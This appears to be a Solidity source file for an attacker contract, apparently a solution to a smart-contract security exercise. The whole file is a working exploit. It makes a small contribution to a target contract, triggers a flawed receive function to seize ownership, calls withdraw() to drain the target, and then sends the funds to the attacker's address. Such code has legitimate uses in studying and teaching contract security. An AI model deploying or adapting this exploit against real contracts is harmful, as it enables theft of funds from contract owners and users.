// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address payable public attacker;

    constructor(address payable _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = payable(msg.sender);
    }

    function attack() public payable {
        // Contribute first time so we can use receive later.
        require(msg.value >= 2 wei, "Need to send at least 2 wei.");
        vulnerableScAddress.call{value: 1 wei}(
            abi.encodeWithSignature("contribute()")
        );

        // Trigger receive vulnerability to claim ownership.
        vulnerableScAddress.call{value: 1 wei}("");

        // Now that we are owners, withdraw all funds.
        vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
    }

    function claimAndRun() public {
        require(msg.sender == attacker, "not your bounty, buddy.");
        attacker.transfer(address(this).balance);
    }
}
